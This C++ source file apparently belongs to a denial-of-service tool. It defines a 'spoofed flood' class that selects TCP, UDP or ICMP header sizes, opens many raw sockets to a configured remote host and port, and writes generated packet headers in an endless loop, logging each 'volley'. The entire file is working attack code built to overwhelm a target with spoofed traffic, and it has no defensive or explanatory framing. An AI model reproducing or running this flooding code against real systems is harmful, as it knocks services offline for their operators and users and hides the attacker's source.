#include "base_spoofed_flood.h"
#include "utils.h"

base_spoofed_flood::base_spoofed_flood(std::shared_ptr<Config> config, int protocol) :
                                        Vector(std::move(config)), proto{protocol} {
    switch(proto){
        case IPPROTO_TCP:
        case IPPROTO_UDP:
            hdr_len = 8192;
            break;
        case IPPROTO_ICMP:
            hdr_len = 400;
            break;
        default:
            fputs("[-] protocol not found", stderr);
            exit(EXIT_FAILURE);
    }
}

void base_spoofed_flood::run() {
    std::vector<std::unique_ptr<Rsocket>> sockets{};
    char hdr[hdr_len];
    int len = 0;
    init_sockets(sockets);

    while(true) {
        for(auto& socket : sockets) {
            if(!socket->Alive())
                socket->Open();
            len = gen_hdr(hdr);
            if(socket->Write(hdr, len) == -1){
                socket->Close();
                socket->Open();
            }
            fputs("[+] Voly Sent\n", stderr);
        }
        utils::pause(config->time);
    }
}

void base_spoofed_flood::init_sockets(std::vector<std::unique_ptr<Rsocket>> &sockets) {
    sockets.reserve(config->conn);
    for(int i = 0; i < config->conn; ++i)
        sockets.emplace_back(std::unique_ptr<Rsocket>(new Rsocket(config->rhost, config->rport, proto)));
}
